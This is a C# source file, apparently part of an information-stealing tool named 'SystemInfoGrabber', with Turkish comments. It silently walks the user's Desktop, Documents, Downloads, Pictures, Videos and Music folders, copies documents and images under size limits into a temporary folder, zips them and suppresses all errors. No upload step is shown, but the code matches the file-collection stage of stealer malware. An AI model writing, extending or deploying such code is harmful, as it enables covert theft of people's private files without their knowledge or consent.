using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;

namespace SystemInfoGrabber
{
    public static class FileGrabber
    {
        private static readonly Dictionary<string, double> FileTypeLimits = new Dictionary<string, double>(StringComparer.OrdinalIgnoreCase)
        {
            { ".txt", 2 }, { ".pdf", 10 }, { ".doc", 10 }, { ".docx", 10 },
            { ".xls", 10 }, { ".xlsx", 10 }, { ".png", 5 }, { ".jpg", 5 },
            { ".jpeg", 5 }, { ".imeg", 5 }
        };

        private static readonly Dictionary<string, string> TargetFolders = new Dictionary<string, string>
        {
            { "Desktop", "Desktop" },
            { "Documents", "Documents" },
            { "Downloads", "Downloads" },
            { "Pictures", "Pictures" },
            { "Videos", "Videos" },
            { "Music", "Music" }
        };

        public static int TotalFilesCopied { get; private set; }
        public static int TotalFilesSkipped { get; private set; }
        public static long TotalBytesCopied { get; private set; }

        public static bool GrabAllFiles(string zipPath)
        {
            TotalFilesCopied = 0;
            TotalFilesSkipped = 0;
            TotalBytesCopied = 0;

            try
            {
                if (File.Exists(zipPath)) File.Delete(zipPath);

                string tempRoot = Path.Combine(Path.GetTempPath(), $"FG_{Guid.NewGuid():N}");
                string tempFiles = Path.Combine(tempRoot, "files");
                Directory.CreateDirectory(tempFiles);

                foreach (var target in TargetFolders)
                {
                    string sourcePath = GetSpecialFolderPath(target.Key);

                    if (!Directory.Exists(sourcePath)) continue;

                    string destFolder = Path.Combine(tempFiles, target.Value);
                    Directory.CreateDirectory(destFolder);

                    // Tüm dosyaları recursive olarak topla
                    var allFiles = GetAllFiles(sourcePath);

                    foreach (var file in allFiles)
                    {
                        try
                        {
                            FileInfo fi = new FileInfo(file);
                            string ext = fi.Extension.ToLower();

                            // Sadece izin verilen uzantıları al
                            if (!FileTypeLimits.ContainsKey(ext))
                                continue;

                            double limitMB = FileTypeLimits[ext];
                            double fileSizeMB = fi.Length / (1024.0 * 1024.0);

                            if (fi.Length > limitMB * 1024 * 1024)
                            {
                                TotalFilesSkipped++;
                                continue;
                            }

                            // Kaynak klasöre göre relative path bul
                            string relativePath = file.Substring(sourcePath.Length).TrimStart('\\', '/');
                            string destDir = Path.Combine(destFolder, Path.GetDirectoryName(relativePath));

                            if (!string.IsNullOrEmpty(destDir) && !Directory.Exists(destDir))
                                Directory.CreateDirectory(destDir);

                            string destFile = Path.Combine(destFolder, relativePath);

                            // Aynı isimde dosya varsa numaralandır
                            int cnt = 1;
                            while (File.Exists(destFile))
                            {
                                string dir = Path.GetDirectoryName(relativePath);
                                string fname = Path.GetFileNameWithoutExtension(relativePath);
                                string newName = $"{fname}_{cnt++}{ext}";
                                destFile = Path.Combine(destFolder, dir, newName);
                            }

                            File.Copy(file, destFile);
                            TotalFilesCopied++;
                            TotalBytesCopied += fi.Length;
                        }
                        catch (UnauthorizedAccessException)
                        {
                            TotalFilesSkipped++;
                        }
                        catch (IOException)
                        {
                            TotalFilesSkipped++;
                        }
                        catch
                        {
                            TotalFilesSkipped++;
                        }
                    }
                }

                if (TotalFilesCopied > 0)
                    ZipFile.CreateFromDirectory(tempRoot, zipPath, CompressionLevel.Optimal, false);

                try { Directory.Delete(tempRoot, true); } catch { }
                return true;
            }
            catch
            {
                return false;
            }
        }

        private static List<string> GetAllFiles(string rootPath)
        {
            var files = new List<string>();
            var directories = new Stack<string>();
            directories.Push(rootPath);

            while (directories.Count > 0)
            {
                string currentDir = directories.Pop();

                try
                {
                    // Klasördeki dosyaları ekle
                    foreach (string file in Directory.GetFiles(currentDir))
                    {
                        files.Add(file);
                    }

                    // Alt klasörleri stack'e ekle
                    foreach (string dir in Directory.GetDirectories(currentDir))
                    {
                        try
                        {
                            directories.Push(dir);
                        }
                        catch (UnauthorizedAccessException) { }
                        catch { }
                    }
                }
                catch (UnauthorizedAccessException) { }
                catch { }
            }

            return files;
        }

        private static string GetSpecialFolderPath(string name)
        {
            try
            {
                if (name == "Desktop")
                    return Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                if (name == "Documents")
                    return Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                if (name == "Downloads")
                    return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
                if (name == "Pictures")
                    return Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
                if (name == "Videos")
                    return Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
                if (name == "Music")
                    return Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            }
            catch { }

            // Fallback
            return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), name);
        }
    }
}